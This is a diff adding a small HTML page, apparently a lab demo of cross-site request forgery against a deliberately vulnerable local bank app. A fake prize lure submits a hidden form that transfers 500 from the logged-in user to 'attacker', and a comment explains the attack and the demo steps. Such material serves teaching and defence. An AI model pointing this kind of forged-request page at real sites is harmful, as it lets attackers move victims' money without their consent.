@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head><title>You Won a Prize!</title></head>
+<body>
+  <h1>Congratulations! Click below to claim your $100 gift card.</h1>
+  <button onclick="document.getElementById('csrf').submit()">Claim Prize</button>
+
+  <!--
+    CSRF ATTACK: This form submits to VulnBank's /transfer endpoint.
+    If the victim is logged in to localhost:3000, their browser will
+    attach their session cookie automatically — the server can't tell
+    this request didn't come from its own page.
+
+    To demo:
+      1. Log in to http://localhost:3000 as alice
+      2. Open http://localhost:3000/attacker.html in the same browser
+      3. Click "Claim Prize" — alice's balance drops by 500
+  -->
+  <form id="csrf" action="http://localhost:3000/transfer" method="POST" style="display:none">
+    <input type="hidden" name="to"     value="attacker" />
+    <input type="hidden" name="amount" value="500" />
+  </form>
+</body>
+</html>
